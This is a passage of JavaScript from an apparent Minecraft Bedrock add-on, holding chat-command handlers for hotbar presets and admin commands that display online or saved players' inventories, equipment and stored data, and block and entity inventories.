                    coordinates = evaluateCoordinates((switchTestB?.split(" ")?.slice(3)?.join(" ") ?? undefined).replaceAll(",", "").split("~").join(" ~").split("^").join(" ^").split("*").join(" *").replaceAll("  ", " ").trimStart().split(" ")[0].replaceAll(" ", ""), (switchTestB?.split(" ")?.slice(3)?.join(" ") ?? undefined).replaceAll(",", "").split("~").join(" ~").split("^").join(" ^").split("*").join(" *").replaceAll("  ", " ").trimStart().split(" ")[1].replaceAll(" ", ""), (switchTestB?.split(" ")?.slice(3)?.join(" ") ?? undefined).replaceAll(",", "").split("~").join(" ~").split("^").join(" ^").split("*").join(" *").replaceAll("  ", " ").trimStart().split(" ")[2].replaceAll(" ", ""), player?.location ?? { x: 0, y: 0, z: 0 }, player?.getRotation() ?? { x: 0, y: 0 });
                }
                catch { }
                player.sendMessage(JSON.stringify(coordinates) + ", " + (switchTestB?.split(" ")?.slice(3)?.join(" ") ?? undefined).replaceAll(",", "").split("~").join(" ~").split("^").join(" ^").split("*").join(" *").replaceAll("  ", " ").trimStart().split(" ")[0].replaceAll(" ", ""));
                if ((switchTestB?.split(" ")?.slice(2)?.join(" ") ?? undefined) != undefined) {
                    player.setDynamicProperty("hotbarPreset" + Number(switchTestB.slice(5).split(" ")[0]), (switchTestB?.split(" ")?.slice(2)[0] ?? undefined) + " " + coordinates.x + " " + coordinates.y + " " + coordinates.z);
                }
                else {
                    player.setDynamicProperty("hotbarPreset" + Number(switchTestB.slice(5).split(" ")[0]));
                } /*
                hotbarSwap(Number(newMessage.slice(2)) % 3, Math.ceil(Number(newMessage.slice(2))/3)); */
                if ((switchTestB?.split(" ")?.slice(2)?.join(" ") ?? undefined) != undefined) {
                    player.sendMessage(`Set hotbar preset ${switchTestB.slice(5).split(" ")[0]} to dimension: ${(switchTestB?.split(" ")?.slice(2)?.join(" ") ?? undefined).replaceAll(",", "").split(" ")[0]}, x: ${coordinates.x}, y: ${coordinates.y}, z: ${coordinates.z}. `);
                }
                else {
                    player.sendMessage(`Removed hotbar preset ${switchTest.slice(5).split(" ")[0]}. `);
                }
                break; /*
            case !!switchTest.match(/^h2$/):
                eventData.cancel = true;
                let inventoryf = player.getComponent("inventory") as EntityInventoryComponent
                let inventoryblockb = world.getDimension(String(player.getDynamicProperty("blockTransferPreset0")).split(", ")[0]).getBlock({x: Number(String(player.getDynamicProperty("blockTransferPreset0")).split(", ")[1]), y: Number(String(player.getDynamicProperty("blockTransferPreset0")).split(", ")[2]), z: Number(String(player.getDynamicProperty("blockTransferPreset0")).split(", ")[3])}).getComponent("inventory") as BlockInventoryComponent
        system.run(()=>{try{for(let i = 0; i < 9; i++){inventoryf.container.swapItems(i, i+9, inventoryblockb.container)}; }catch(e){eventData.sender.sendMessage("§c" + e + e.stack)}})
            break;
            case !!switchTest.match(/^h3$/):
                eventData.cancel = true;
                let inventoryg = player.getComponent("inventory") as EntityInventoryComponent
                let inventoryblockc = world.getDimension(String(player.getDynamicProperty("blockTransferPreset0")).split(", ")[0]).getBlock({x: Number(String(player.getDynamicProperty("blockTransferPreset0")).split(", ")[1]), y: Number(String(player.getDynamicProperty("blockTransferPreset0")).split(", ")[2]), z: Number(String(player.getDynamicProperty("blockTransferPreset0")).split(", ")[3])}).getComponent("inventory") as BlockInventoryComponent
        system.run(()=>{try{for(let i = 0; i < 9; i++){inventoryg.container.swapItems(i, i+18, inventoryblockc.container)}; }catch(e){eventData.sender.sendMessage("§c" + e + e.stack)}})
            break;
            case !!switchTest.match(/^h4$/):
                eventData.cancel = true;
                let inventoryg4 = player.getComponent("inventory") as EntityInventoryComponent
                let inventoryblockc4 = world.getDimension(String(player.getDynamicProperty("blockTransferPreset1")).split(", ")[0]).getBlock({x: Number(String(player.getDynamicProperty("blockTransferPreset1")).split(", ")[1]), y: Number(String(player.getDynamicProperty("blockTransferPreset1")).split(", ")[2]), z: Number(String(player.getDynamicProperty("blockTransferPreset1")).split(", ")[3])}).getComponent("inventory") as BlockInventoryComponent
        system.run(()=>{try{for(let i = 0; i < 9; i++){inventoryg4.container.swapItems(i, i, inventoryblockc4.container)}; }catch(e){eventData.sender.sendMessage("§c" + e + e.stack)}})
            break;
            case !!switchTest.match(/^h5$/):
                eventData.cancel = true;
                let inventoryg5 = player.getComponent("inventory") as EntityInventoryComponent
                let inventoryblockc5 = world.getDimension(String(player.getDynamicProperty("blockTransferPreset1")).split(", ")[0]).getBlock({x: Number(String(player.getDynamicProperty("blockTransferPreset1")).split(", ")[1]), y: Number(String(player.getDynamicProperty("blockTransferPreset1")).split(", ")[2]), z: Number(String(player.getDynamicProperty("blockTransferPreset1")).split(", ")[3])}).getComponent("inventory") as BlockInventoryComponent
        system.run(()=>{try{for(let i = 0; i < 9; i++){inventoryg5.container.swapItems(i, i+9, inventoryblockc5.container)}; }catch(e){eventData.sender.sendMessage("§c" + e + e.stack)}})
            break;
            case !!switchTest.match(/^h6$/):
                eventData.cancel = true;
                let inventoryg6 = player.getComponent("inventory") as EntityInventoryComponent
                let inventoryblockc6 = world.getDimension(String(player.getDynamicProperty("blockTransferPreset1")).split(", ")[0]).getBlock({x: Number(String(player.getDynamicProperty("blockTransferPreset1")).split(", ")[1]), y: Number(String(player.getDynamicProperty("blockTransferPreset1")).split(", ")[2]), z: Number(String(player.getDynamicProperty("blockTransferPreset1")).split(", ")[3])}).getComponent("inventory") as BlockInventoryComponent
        system.run(()=>{try{for(let i = 0; i < 9; i++){inventoryg6.container.swapItems(i, i+18, inventoryblockc6.container)}; }catch(e){eventData.sender.sendMessage("§c" + e + e.stack)}})
            break; */
            case !!switchTest.match(/^invsee$$/):
                eventData.cancel = true;
                system.run(() => {
                    const inventoryd2 = world.getPlayers().find((playerFinders) => (playerFinders == targetSelectorB(switchTestB.slice(7), "", Number(eventData.sender.id)))).getComponent("inventory");
                    const equipmentd2 = world.getPlayers().find((playerFinders) => (playerFinders == targetSelectorB(switchTestB.slice(7), "", Number(eventData.sender.id)))).getComponent("equippable");
                    try {
                        let slotsArray = [];
                        for (let i = 0; i < inventoryd2.inventorySize; i++) {
                            if (inventoryd2.container.getItem(Number(i)) !== undefined) {
                                slotsArray = slotsArray.concat(String("slot: " + i + "§r§f, item: " + inventoryd2.container.getItem(Number(i)).typeId + "§r§f, amount: " + inventoryd2.container.getItem(Number(i)).amount + "§r§f, nameTag: " + inventoryd2.container.getItem(Number(i)).nameTag + "§r§f, lore: " + (JSONStringify(inventoryd2.container.getItem(Number(i)).getLore() ?? [], true) ?? "[]") + ", enchantments: " + ((!!inventoryd2.container.getItem(Number(i))?.getComponent("enchantable")) ? (JSONStringify(inventoryd2.container.getItem(Number(i))?.getComponent("enchantable")?.getEnchantments() ?? [], true) ?? "[]") : "N/A")));
                            }
                            else {
                                slotsArray = slotsArray.concat("slot: " + i + ", item: minecraft:air");
                            }
                        }
                        ;
                        ;
                        for (let i = 0; i < 6; i++) {
                            try {
                                let item = equipmentd2.getEquipment([EquipmentSlot.Head, EquipmentSlot.Chest, EquipmentSlot.Legs, EquipmentSlot.Feet, EquipmentSlot.Mainhand, EquipmentSlot.Offhand][i]);
                                if (item !== undefined) {
                                    slotsArray = slotsArray.concat(String("slot: " + [EquipmentSlot.Head, EquipmentSlot.Chest, EquipmentSlot.Legs, EquipmentSlot.Feet, EquipmentSlot.Mainhand, EquipmentSlot.Offhand][i] + ", item: " + item.typeId + ", amount: " + item.amount + ", nameTag: " + item.nameTag + "§r§f, lore: " + (JSONStringify(item.getLore() ?? [], true)) + "§r§f, enchantments: " + ((!!item.getComponent("enchantable")) ? (JSON.stringify(item?.getComponent("enchantable")?.getEnchantments() ?? []) ?? "[]") : "N/A")));
                                }
                                else {
                                    slotsArray = slotsArray.concat("slot: " + [EquipmentSlot.Head, EquipmentSlot.Chest, EquipmentSlot.Legs, EquipmentSlot.Feet, EquipmentSlot.Mainhand, EquipmentSlot.Offhand][i] + ", item: minecraft:air");
                                }
                            }
                            catch { }
                        }
                        ;
                        eventData.sender.sendMessage(String(world.getPlayers().find((playerFinders) => (playerFinders == targetSelectorB(switchTestB.slice(7), "", Number(eventData.sender.id)))).name + "'s Items: \n" + slotsArray.join("§r§f\n")));
                    }
                    catch (e) {
                        eventData.sender.sendMessage("§c" + e + e.stack);
                    }
                });
                break;
            case !!switchTest.match(/^invseep$$/):
                eventData.cancel = true;
                system.run(() => {
                    const inventoryd2 = world.getPlayers().find((playerFinders) => (playerFinders == targetSelectorB(switchTestB.slice(8), "", Number(eventData.sender.id)))).getComponent("inventory");
                    const equipmentd2 = world.getPlayers().find((playerFinders) => (playerFinders == targetSelectorB(switchTestB.slice(8), "", Number(eventData.sender.id)))).getComponent("equippable");
                    try {
                        let slotsArray = [];
                        for (let i = 0; i < inventoryd2.inventorySize; i++) {
                            if (inventoryd2.container.getItem(Number(i)) !== undefined) {
                                slotsArray = slotsArray.concat(String("slot: " + i + "§r§f, item: " + inventoryd2.container.getItem(Number(i)).typeId + "§r§f, amount: " + inventoryd2.container.getItem(Number(i)).amount + "§r§f, nameTag: " + inventoryd2.container.getItem(Number(i)).nameTag + "§r§f, lore: " + (JSONStringify(inventoryd2.container.getItem(Number(i)).getLore() ?? [], true) ?? "[]") + ", enchantments: " + ((!!inventoryd2.container.getItem(Number(i))?.getComponent("enchantable")) ? (JSONStringify(inventoryd2.container.getItem(Number(i))?.getComponent("enchantable")?.getEnchantments() ?? [], true) ?? "[]") : "N/A") + ", properties: " + JSONStringify(((i) => { if ((inventoryd2.container.getItem(Number(i)).getDynamicPropertyIds() ?? []).length == 0) {
                                    return inventoryd2.container.getItem(Number(i)).isStackable ? null : {};
                                }
                                else {
                                    let properties = {};
                                    inventoryd2.container.getItem(Number(i)).getDynamicPropertyIds().forEach(v => properties[v] = inventoryd2.container.getItem(Number(i))?.getDynamicProperty(v));
                                    return properties;
                                } })(i) ?? (inventoryd2.container.getItem(Number(i)).isStackable ? null : {}), true) ?? (inventoryd2.container.getItem(Number(i)).isStackable ? "null" : {})));
                            }
                            else {
                                slotsArray = slotsArray.concat("slot: " + i + ", item: minecraft:air");
                            }
                        }
                        ;
                        ;
                        for (let i = 0; i < 6; i++) {
                            try {
                                let item = equipmentd2.getEquipment([EquipmentSlot.Head, EquipmentSlot.Chest, EquipmentSlot.Legs, EquipmentSlot.Feet, EquipmentSlot.Mainhand, EquipmentSlot.Offhand][i]);
                                if (item !== undefined) {
                                    slotsArray = slotsArray.concat(String("slot: " + [EquipmentSlot.Head, EquipmentSlot.Chest, EquipmentSlot.Legs, EquipmentSlot.Feet, EquipmentSlot.Mainhand, EquipmentSlot.Offhand][i] + ", item: " + item.typeId + ", amount: " + item.amount + ", nameTag: " + item.nameTag + "§r§f, lore: " + (JSONStringify(item.getLore() ?? [], true)) + "§r§f, enchantments: " + ((!!item.getComponent("enchantable")) ? (JSON.stringify(item?.getComponent("enchantable")?.getEnchantments() ?? []) ?? "[]") : "N/A") + ", properties: " + JSONStringify(((i) => { if ((item.getDynamicPropertyIds() ?? []).length == 0) {
                                        return item.isStackable ? null : {};
                                    }
                                    else {
                                        let properties = {};
                                        item.getDynamicPropertyIds().forEach(v => properties[v] = item?.getDynamicProperty(v));
                                        return properties;
                                    } })(i) ?? (item.isStackable ? null : {}), true) ?? (item.isStackable ? "null" : {})));
                                }
                                else {
                                    slotsArray = slotsArray.concat("slot: " + [EquipmentSlot.Head, EquipmentSlot.Chest, EquipmentSlot.Legs, EquipmentSlot.Feet, EquipmentSlot.Mainhand, EquipmentSlot.Offhand][i] + ", item: minecraft:air");
                                }
                            }
                            catch { }
                        }
                        ;
                        eventData.sender.sendMessage(String(world.getPlayers().find((playerFinders) => (playerFinders == targetSelectorB(switchTestB.slice(8), "", Number(eventData.sender.id)))).name + "'s Items: \n" + slotsArray.join("§r§f\n")));
                    }
                    catch (e) {
                        eventData.sender.sendMessage("§c" + e + e.stack);
                    }
                });
                break;
            case !!switchTest.match(/^offlineinfo$$/):
                eventData.cancel = true;
                try {
                    let players = savedPlayer.getSavedPlayers().filter((p) => (p.name == switchTestB.split(" ").slice(1).join(" ")));
                    if (players.length == 0) {
                        player.sendMessage("§cError: no players with that name were found");
                    }
                    else {
                        if (players.length > 1) {
                            player.sendMessage("§cError: multiple saved players with that name were found, with the following uuids: " + [players[0]?.id, players[1]?.id, players[2]?.id, players[3]?.id]);
                        }
                        else {
                            let player = players[0];
                            eventData.sender.sendMessage(String(player.name + (world.getAllPlayers().find((p) => (p.id == player.id)) != undefined ? " (Online)" : " (last seen: " + new Date(Number(player.lastOnline) + (Number(event.sender.getDynamicProperty("andexdbPersonalSettings:timeZone") ?? 0) * 3600000)).toLocaleString( /*'en-US', {dateStyle: "full",timeStyle: 'full',timeZone: String(world.getDynamicProperty("andexdb:timeZone") ?? "UTC"),timeZoneName: "long"}*/) + ")") + " Data: \n" + JSON.stringify(player).replaceAll(/(?<!\\)(?![},:](\"|{\"))\"/g, "§r§f\"")));
                        }
                    }
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                }
                break;
            case !!switchTest.match(/^offlineuuidinfo$$/):
                eventData.cancel = true;
                try {
                    let players = savedPlayer.getSavedPlayers().filter((p) => (p.id == switchTestB.split(" ").slice(1).join(" ")));
                    if (players.length == 0) {
                        player.sendMessage("§cError: no players with that uuid were found");
                    }
                    else {
                        let player = players[0];
                        eventData.sender.sendMessage(String(player.name + (world.getAllPlayers().find((p) => (p.id == player.id)) != undefined ? " (Online) " : " (last seen: " + new Date(Number(player.lastOnline) + (Number(event.sender.getDynamicProperty("andexdbPersonalSettings:timeZone") ?? 0) * 3600000)).toLocaleString() + ")") + " Data: \n" + JSON.stringify(player).replaceAll(/(?<!\\)(?![},:](\"|{\"))\"/g, "§r§f\"")));
                    }
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                }
                break;
            case !!switchTest.match(/^offlineinforaw$$/):
                eventData.cancel = true;
                try {
                    let players = savedPlayer.getSavedPlayers().filter((p) => (p.name == switchTestB.split(" ").slice(1).join(" ")));
                    if (players.length == 0) {
                        player.sendMessage("§cError: no players with that name were found");
                    }
                    else {
                        if (players.length > 1) {
                            player.sendMessage("§cError: multiple saved players with that name were found, with the following uuids: " + [players[0]?.id, players[1]?.id, players[2]?.id, players[3]?.id]);
                        }
                        else {
                            let player = players[0];
                            eventData.sender.sendMessage(String(player.name + (world.getAllPlayers().find((p) => (p.id == player.id)) != undefined ? " (Online)" : " (last seen: " + new Date(Number(player.lastOnline) + (Number(event.sender.getDynamicProperty("andexdbPersonalSettings:timeZone") ?? 0) * 3600000)).toLocaleString( /*'en-US', {dateStyle: "full",timeStyle: 'full',timeZone: String(world.getDynamicProperty("andexdb:timeZone") ?? "UTC"),timeZoneName: "long"}*/) + ")") + " Data: \n" + JSON.stringify(player).replaceAll("§", "§§")));
                        }
                    }
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                }
                break;
            case !!switchTest.match(/^offlineuuidinforaw$$/):
                eventData.cancel = true;
                try {
                    let players = savedPlayer.getSavedPlayers().filter((p) => (p.id == switchTestB.split(" ").slice(1).join(" ")));
                    if (players.length == 0) {
                        player.sendMessage("§cError: no players with that uuid were found");
                    }
                    else {
                        let player = players[0];
                        eventData.sender.sendMessage(String(player.name + (world.getAllPlayers().find((p) => (p.id == player.id)) != undefined ? " (Online) " : " (last seen: " + new Date(Number(player.lastOnline) + (Number(event.sender.getDynamicProperty("andexdbPersonalSettings:timeZone") ?? 0) * 3600000)).toLocaleString() + ")") + " Data: \n" + JSON.stringify(player).replaceAll("§", "§§")));
                    }
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                }
                break;
            case !!switchTest.match(/^offlineinfourl$$/):
                eventData.cancel = true;
                try {
                    let players = savedPlayer.getSavedPlayers().filter((p) => (p.name == switchTestB.split(" ").slice(1).join(" ")));
                    if (players.length == 0) {
                        player.sendMessage("§cError: no players with that name were found");
                    }
                    else {
                        if (players.length > 1) {
                            player.sendMessage("§cError: multiple saved players with that name were found, with the following uuids: " + [players[0]?.id, players[1]?.id, players[2]?.id, players[3]?.id]);
                        }
                        else {
                            let player = players[0];
                            eventData.sender.sendMessage(String(player.name + (world.getAllPlayers().find((p) => (p.id == player.id)) != undefined ? " (Online)" : " (last seen: " + new Date(Number(player.lastOnline) + (Number(event.sender.getDynamicProperty("andexdbPersonalSettings:timeZone") ?? 0) * 3600000)).toLocaleString( /*'en-US', {dateStyle: "full",timeStyle: 'full',timeZone: String(world.getDynamicProperty("andexdb:timeZone") ?? "UTC"),timeZoneName: "long"}*/) + ")") + " Data: \n" + escape(JSON.stringify(player))));
                        }
                    }
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                }
                break;
            case !!switchTest.match(/^offlineuuidinfourl$$/):
                eventData.cancel = true;
                try {
                    let players = savedPlayer.getSavedPlayers().filter((p) => (p.id == switchTestB.split(" ").slice(1).join(" ")));
                    if (players.length == 0) {
                        player.sendMessage("§cError: no players with that uuid were found");
                    }
                    else {
                        let player = players[0];
                        eventData.sender.sendMessage(String(player.name + (world.getAllPlayers().find((p) => (p.id == player.id)) != undefined ? " (Online) " : " (last seen: " + new Date(Number(player.lastOnline) + (Number(event.sender.getDynamicProperty("andexdbPersonalSettings:timeZone") ?? 0) * 3600000)).toLocaleString() + ")") + " Data: \n" + escape(JSON.stringify(player))));
                    }
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                }
                break;
            case !!switchTest.match(/^offlineinfoescaped$$/):
                eventData.cancel = true;
                try {
                    let players = savedPlayer.getSavedPlayers().filter((p) => (p.name == switchTestB.split(" ").slice(1).join(" ")));
                    if (players.length == 0) {
                        player.sendMessage("§cError: no players with that name were found");
                    }
                    else {
                        if (players.length > 1) {
                            player.sendMessage("§cError: multiple saved players with that name were found, with the following uuids: " + [players[0]?.id, players[1]?.id, players[2]?.id, players[3]?.id]);
                        }
                        else {
                            let player = players[0];
                            eventData.sender.sendMessage(String(player.name + (world.getAllPlayers().find((p) => (p.id == player.id)) != undefined ? " (Online)" : " (last seen: " + new Date(Number(player.lastOnline) + (Number(event.sender.getDynamicProperty("andexdbPersonalSettings:timeZone") ?? 0) * 3600000)).toLocaleString( /*'en-US', {dateStyle: "full",timeStyle: 'full',timeZone: String(world.getDynamicProperty("andexdb:timeZone") ?? "UTC"),timeZoneName: "long"}*/) + ")") + " Data: \n" + arrayModifier(JSON.stringify(player).split(""), (v) => v.charCodeAt(0)).join()));
                        }
                    }
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                }
                break;
            case !!switchTest.match(/^offlineuuidinfoescaped$$/):
                eventData.cancel = true;
                try {
                    let players = savedPlayer.getSavedPlayers().filter((p) => (p.id == switchTestB.split(" ").slice(1).join(" ")));
                    if (players.length == 0) {
                        player.sendMessage("§cError: no players with that uuid were found");
                    }
                    else {
                        let player = players[0];
                        eventData.sender.sendMessage(String(player.name + (world.getAllPlayers().find((p) => (p.id == player.id)) != undefined ? " (Online) " : " (last seen: " + new Date(Number(player.lastOnline) + (Number(event.sender.getDynamicProperty("andexdbPersonalSettings:timeZone") ?? 0) * 3600000)).toLocaleString() + ")") + " Data: \n" + arrayModifier(JSON.stringify(player).split(""), (v) => v.charCodeAt(0)).join()));
                    }
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                }
                break;
            case !!switchTest.match(/^offlineinvsee$$/):
                eventData.cancel = true;
                try {
                    let slotsArray = [];
                    let players = savedPlayer.getSavedPlayers().filter((p) => (p.name == switchTestB.split(" ").slice(1).join(" ")));
                    if (players.length == 0) {
                        player.sendMessage("§cError: no players with that name were found");
                    }
                    else {
                        if (players.length > 1) {
                            player.sendMessage("§cError: multiple saved players with that name were found, with the following uuids: " + [players[0]?.id, players[1]?.id, players[2]?.id, players[3]?.id]);
                        }
                        else {
                            let player = players[0];
                            let items = player.items.inventory.concat(player.items.equipment);
                            items.forEach((item) => { if (item.count != 0) {
                                slotsArray = slotsArray.concat(String("slot: " + item.slot + "§r§f, item: " + item.id + "§r§f, amount: " + item.count + "§r§f, nameTag: " + item.name + "§r§f, lore: " + JSONStringify(item.lore ?? [], true) ?? "[]" + "§r§f, enchantments: " + JSONStringify(item.enchants ?? "N/A", true) ?? "N/A"));
                            }
                            else {
                                slotsArray = slotsArray.concat("slot: " + item.slot + ", item: minecraft:air");
                            } });
                            ;
                            eventData.sender.sendMessage(String("(format_version: " + player.format_version + ") " + player.name + (world.getAllPlayers().find((p) => (p.id == player.id)) != undefined ? " (Online)" : " (last seen: " + new Date(Number(player.lastOnline) + (Number(event.sender.getDynamicProperty("andexdbPersonalSettings:timeZone") ?? 0) * 3600000)).toLocaleString() + ")") + " Items: \n" + slotsArray.join("§r§f\n")));
                        }
                    }
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                }
                break;
            case !!switchTest.match(/^offlineuuidinvsee$$/):
                eventData.cancel = true;
                try {
                    let slotsArray = [];
                    let players = savedPlayer.getSavedPlayers().filter((p) => (p.id == switchTestB.split(" ").slice(1).join(" ")));
                    if (players.length == 0) {
                        player.sendMessage("§cError: no players with that uuid were found");
                    }
                    else {
                        let player = players[0];
                        let items = player.items.inventory.concat(player.items.equipment);
                        items.forEach((item) => { if (item.count != 0) {
                            slotsArray = slotsArray.concat(String("slot: " + item.slot + "§r§f, item: " + item.id + "§r§f, amount: " + item.count + "§r§f, nameTag: " + item.name + "§r§f, lore: " + JSONStringify(item.lore ?? [], true) ?? "[]" + "§r§f, enchantments: " + JSON.stringify(item.enchants ?? "N/A") ?? "N/A"));
                        }
                        else {
                            slotsArray = slotsArray.concat("slot: " + item.slot + ", item: minecraft:air");
                        } });
                        ;
                        eventData.sender.sendMessage(String("(format_version: " + player.format_version + ") " + player.name + (world.getAllPlayers().find((p) => (p.id == player.id)) != undefined ? " (Online) " : " (last seen: " + new Date(Number(player.lastOnline) + (Number(event.sender.getDynamicProperty("andexdbPersonalSettings:timeZone") ?? 0) * 3600000)).toLocaleString() + ")") + " Items: \n" + slotsArray.join("§r§f\n")));
                    }
                }
                catch (e) {
                    eventData.sender.sendMessage("§c" + e + e.stack);
                }
                break;
            case !!switchTest.match(/^binvsee$$/):
                eventData.cancel = true;
                system.run(() => {
                    let block = world.getDimension(switchTestB.split(" ")[1].trim().replace("~", player.dimension.id + "\0")).getBlock(coordinatesB((switchTestB.split(" ")[1].trim().startsWith("~") && switchTestB.split(" ")[1].trim().length != 1) ? switchTestB.split(" ").slice(1).join(" ").trim().slice(1) : switchTestB.split(" ").slice(2).join(" ").trim(), player.location, player.getViewDirection())); /*
                    console.warn(block)*/
                    const inventoryd2 = block.getComponent("inventory");
                    try {
                        let slotsArray = [];
                        for (let i = 0; i < inventoryd2.container.size; i++) {
                            if (inventoryd2.container.getItem(Number(i)) !== undefined) {
                                slotsArray = slotsArray.concat(String("slot: " + i + ", item: " + inventoryd2.container.getItem(Number(i)).typeId + ", amount: " + inventoryd2.container.getItem(Number(i)).amount + ", nameTag: " + inventoryd2.container.getItem(Number(i)).nameTag + "§r§f, lore: " + (JSONStringify(inventoryd2.container.getItem(Number(i)).getLore() ?? [], true)) + "§r§f, enchantments: " + ((!!inventoryd2.container.getItem(Number(i))?.getComponent("enchantable")) ? (JSON.stringify(inventoryd2.container.getItem(Number(i))?.getComponent("enchantable")?.getEnchantments() ?? []) ?? "[]") : "N/A")));
                            }
                            else {
                                slotsArray = slotsArray.concat("slot: " + i + ", item: minecraft:air");
                            }
                        }
                        ;
                        eventData.sender.sendMessage(String("Block At " + JSON.stringify({ dimension: block.dimension.id, x: block.x, y: block.y, z: block.z }) + " Items: \n" + slotsArray.join("§r§f\n")));
                    }
                    catch (e) {
                        eventData.sender.sendMessage("§c" + e + e.stack);
                    }
                });
                break;
            case !!switchTest.match(/^einvseeb$$/):
                eventData.cancel = true;
                system.run(() => {
                    const inventoryd2 = world.getDimension("overworld").getEntities().concat(world.getDimension("nether").getEntities()).concat(world.getDimension("the_end").getEntities()).find((playerFinders) => (playerFinders == targetSelectorB(switchTestB.slice(9), "", Number(eventData.sender.id)))).getComponent("inventory");
                    try {
                        let slotsArray = [];
                        for (let i = 0; i < inventoryd2.inventorySize; i++) {
                            if (inventoryd2.container.getItem(Number(i)) !== undefined) {
                                slotsArray = slotsArray.concat(String("slot: " + i + ", item: " + inventoryd2.container.getItem(Number(i)).typeId + ", amount: " + inventoryd2.container.getItem(Number(i)).amount + ", nameTag: " + inventoryd2.container.getItem(Number(i)).nameTag + "§r§f, lore: " + (JSONStringify(inventoryd2.container.getItem(Number(i)).getLore() ?? [], true)) + "§r§f, enchantments: " + ((!!inventoryd2.container.getItem(Number(i))?.getComponent("enchantable")) ? (JSON.stringify(inventoryd2.container.getItem(Number(i))?.getComponent("enchantable")?.getEnchantments() ?? []) ?? "[]") : "N/A")));
                            }
                            else {
                                slotsArray = slotsArray.concat("slot: " + i + ", item: minecraft:air");
                            }
                        }
                        ;
                        eventData.sender.sendMessage(String(world.getDimension("overworld").getEntities().concat(world.getDimension("nether").getEntities()).concat(world.getDimension("the_end").getEntities()).find((playerFinders) => (playerFinders == targetSelectorB(switchTestB.slice(9), "", Number(eventData.sender.id)))).nameTag + "'s Items: \n" + slotsArray.join("§r§f\n")));
                    }
                    catch (e) {
                        eventData.sender.sendMessage("§c" + e + e.stack);
                    }
                });
                break;
            case !!switchTest.match(/^einvsee$$/):
                eventData.cancel = true;
                system.run(() => {
                    const inventoryd2 = world.getDimension("overworld").getEntities().concat(world.getDimension("nether").getEntities()).concat(world.getDimension("the_end").getEntities()).find((playerFinders) => (playerFinders == targetSelectorB(switchTestB.slice(7), "", Number(eventData.sender.id)))).getComponent("inventory");
                    const equipmentd2 = world.getDimension("overworld").getEntities().concat(world.getDimension("nether").getEntities()).concat(world.getDimension("the_end").getEntities()).find((playerFinders) => (playerFinders == targetSelectorB(switchTestB.slice(7), "", Number(eventData.sender.id)))).getComponent("equippable");
                    try {
                        let slotsArray = [];
                        if (!!inventoryd2) {
                            try {
                                for (let i = 0; i < inventoryd2.inventorySize; i++) {
                                    if (inventoryd2.container.getItem(Number(i)) !== undefined) {
                                        slotsArray = slotsArray.concat(String("slot: " + i + ", item: " + inventoryd2.container.getItem(Number(i)).typeId + ", amount: " + inventoryd2.container.getItem(Number(i)).amount + ", nameTag: " + inventoryd2.container.getItem(Number(i)).nameTag + "§r§f, lore: " + (JSONStringify(inventoryd2.container.getItem(Number(i)).getLore() ?? [], true)) + "§r§f, enchantments: " + ((!!inventoryd2.container.getItem(Number(i))?.getComponent("enchantable")) ? (JSON.stringify(inventoryd2.container.getItem(Number(i))?.getComponent("enchantable")?.getEnchantments() ?? []) ?? "[]") : "N/A")));
                                    }
                                    else {
                                        slotsArray = slotsArray.concat("slot: " + i + ", item: minecraft:air");
                                    }
                                }
                                ;
                            }
                            catch { }
                        }
                        if (!!equipmentd2) {
                            for (let i = 0; i < 6; i++) {
                                try {
                                    let item = equipmentd2.getEquipment([EquipmentSlot.Head, EquipmentSlot.Chest, EquipmentSlot.Legs, EquipmentSlot.Feet, EquipmentSlot.Mainhand, EquipmentSlot.Offhand][i]);
                                    if (item !== undefined) {
                                        slotsArray = slotsArray.concat(String("slot: " + [EquipmentSlot.Head, EquipmentSlot.Chest, EquipmentSlot.Legs, EquipmentSlot.Feet, EquipmentSlot.Mainhand, EquipmentSlot.Offhand][i] + ", item: " + item.typeId + ", amount: " + item.amount + ", nameTag: " + item.nameTag + "§r§f, lore: " + (JSONStringify(item.getLore() ?? [], true)) + "§r§f, enchantments: " + ((!!item.getComponent("enchantable")) ? (JSON.stringify(item?.getComponent("enchantable")?.getEnchantments() ?? []) ?? "[]") : "N/A")));
                                    }
                                    else {
                                        slotsArray = slotsArray.concat("slot: " + [EquipmentSlot.Head, EquipmentSlot.Chest, EquipmentSlot.Legs, EquipmentSlot.Feet, EquipmentSlot.Mainhand, EquipmentSlot.Offhand][i] + ", item: minecraft:air");
                                    }
                                }
                                catch { }
                            }
                            ;
                        }
                        eventData.sender.sendMessage(String(world.getDimension("overworld").getEntities().concat(world.getDimension("nether").getEntities()).concat(world.getDimension("the_end").getEntities()).find((playerFinders) => (playerFinders == targetSelectorB(switchTestB.slice(7), "", Number(eventData.sender.id)))).nameTag + "'s Items: \n" + slotsArray.join("§r§f\n")));
                    }
                    catch (e) {
                        eventData.sender.sendMessage("§c" + e + e.stack);
                    }
                });
                break;
            case !!switchTest.match(/^invseeuuidmode$/):
                eventData.cancel = true;
                const inventoryd = world.getDimension("overworld").getEntities().concat(world.getDimension("nether").getEntities()).concat(world.getDimension("the_end").getEntities()).find((playerFinders) => (playerFinders.id == switchTestB.slice(7).split(" ")[0])).getComponent("inventory");
                const equipmentd2 = world.getDimension("overworld").getEntities().concat(world.getDimension("nether").getEntities()).concat(world.getDimension("the_end").getEntities()).find((playerFinders) => (playerFinders.id == switchTestB.slice(7).split(" ")[0])).getComponent("equippable");
                system.run(() => {
                    try {
                        let slotsArray = [];
                        if (!!inventoryd) {
                            try {
                                for (let i = 0; i < inventoryd.inventorySize; i++) {
                                    if (inventoryd.container.getItem(Number(i)) !== undefined) {
